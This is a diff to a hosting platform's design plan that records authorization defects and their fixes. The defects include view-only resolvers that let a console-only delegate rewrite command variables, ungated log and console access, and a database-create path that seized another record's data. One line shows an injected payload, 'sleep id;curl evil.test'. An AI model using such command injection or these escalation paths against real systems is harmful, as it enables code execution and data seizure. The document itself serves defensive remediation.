@@ -2848,6 +2848,51 @@ Driver and infrastructure:
     be. The Phase 5 clause "an `access.manage`-only user cannot grant exec" is
     therefore met in a stronger form: NO non-admin, however broad their
     authority, can grant exec, because exec is non-delegable.
+
+  STATUS SUPERSEDED (2026-08-08, later the same day): the split above is
+  correct, but the phase gate's own worked example -- "delegate console+power
+  (NOT exec, NOT config) ... PROVABLY cannot change config" -- was FALSE as
+  shipped, in THREE places, and is only true now. All three had the same shape:
+  a handler resolved its record through a resolver that checks exactly `view`,
+  then performed an act needing a stronger verb, with nothing underneath asking.
+
+  - `POST /api/v1/instances/{id}/variables` and `.../variables/delete`
+    (`InstanceApi`) resolved through the view-only `visibleInstance` and called
+    `InstanceVariables.setValue/removeValue`, which made no authorization
+    decision at all, and no `TenantWrites` hook covered `InstanceVariableModel`.
+    Since `InstanceVariables.applyToSettings` substitutes `{{KEY}}` into
+    `command` and `cloud_init`, this was privilege escalation to CODE
+    EXECUTION, not an untidy write: the counterfactual shows a console-only
+    delegate turning `sleep {{PWN}}` into `sleep id;curl evil.test`, and the
+    same delegate holds `power` to run it. FIXED in two layers -- a `config`
+    gate on the service (every surface) and a `TenantWrites` beforeValidate +
+    beforeRemove hook on `InstanceVariableModel` (every direct write). Writes
+    require `config` because a variable write IS a config write; a separate
+    verb was REJECTED as a grant-matrix column carrying authority `config`
+    already covers. Reads stay at `view`: the projection returns `has_value`
+    for a secret and never its value.
+  - `GET /api/v1/instances/{id}/logs` -> `InstanceConsoles.tail` checked
+    nothing, so a `view` delegate got the captured output the console
+    WebSocket refuses them. FIXED: `tail` asks `console`, as the socket does.
+  - The `/manage` Console tab (`InstanceConsolePage`) offered no `visibleFor`,
+    so it rendered every RETAINED console episode out of `InstanceLogModel` to
+    anyone the view-only resource scope let through -- the same bytes the
+    socket it fronts gates on `console`. FIXED: `visibleFor` = `console`,
+    matching `InstanceExecPage`.
+
+  Pinned by `TenantInstanceApiTest.aConsoleOnlyDelegateCannotWriteTheVariables
+  ThatBecomeTheCommand` and `TenantInstanceSurfaceTest.theConsoleTabAnswersTo
+  ConsoleAndNotToTheViewScope`, both counterfactualed with the ATTACK (not
+  merely the refusal) and both carrying a positive anchor. Two related defects
+  were fixed in passing: the variable-delete handler ran outside a `Violations`
+  catch (so a typed refusal escaped as the framework's generic error render),
+  and `InstanceTemplates.createRecord` planted the creator's `manage` grant
+  AFTER writing template variables, which the new model hook would have refused
+  mid-create -- ownership is now planted the moment the row exists.
+
+  THE RULE THIS LEAVES: `visibleInstance`-style resolvers answer "may you SEE
+  this", never "may you DO this". A new handler on such a resolver must name
+  the service gate it rides, or it does not ship.
 - **Per-record scheduling reuses the existing cluster-safe claim protocol.**
   Zenit already has `SystemTaskModel`, `CronExpression`, and atomic cluster
   claiming in `TaskService`. The old plan's "ONE global sweeper ScheduledTask"
@@ -3123,7 +3168,29 @@ via any RecordSource, subpage, activity/revision route or WebSocket handshake.
   narrowed in that one place exactly as predicted.
 - Tenant database allocation uses the existing managed-database tier through a
   record-scoped quota and ownership link; it never exposes another tenant's host
-  or credentials. Instance transfer between eligible hosts is a durable,
+  or credentials.
+
+  PREREQUISITE CLOSED (2026-08-08): the managed-database CREATE path was a
+  find-by-name-then-overwrite, so creating a database whose name was taken
+  SEIZED the existing record -- it rewrote engine, image, db_user, db_password,
+  db_name, ephemeral, limits, status and server_id in place, and because
+  `DatabaseInstances.dataVolumeOf` keys the data volume on the record's NAME,
+  the provision that followed remounted the VICTIM'S DATA under attacker-chosen
+  credentials. `M015` declares `unique("name")`; the index was never consulted
+  because the write was an UPDATE. `DatabaseResource.persistRow` then re-queried
+  by name and returned whatever it found as "created", so the UI reported
+  success. Admin-only today, so it was an operator typo silently redeploying a
+  production database; it would have been one-form cross-tenant data seizure
+  the moment this bullet shipped. FIXED: the create lane is INSERT-only with a
+  named refusal (`database_name_taken`) -- both callers were create lanes, so no
+  upsert entry point was owed -- and `createAsync` RETURNS the row it inserted
+  so the resource stops inferring success. The refusal is on the stored name
+  verbatim, so per-owner namespacing (the recorded direction, since the name is
+  also the container handle and the backup directory) needs no change here.
+  Pinned by `DatabaseAdminTest.creatingADatabaseWithATakenNameRefusesInsteadOf
+  SeizingTheExistingOne`, counterfactualed on the VICTIM'S columns.
+
+  Instance transfer between eligible hosts is a durable,
   capacity-reserved operation with rollback and port reallocation; cold transfer
   is the required floor, live migration is not implied.
 - Define the tenant-facing instance API in the same phase as these actions. It
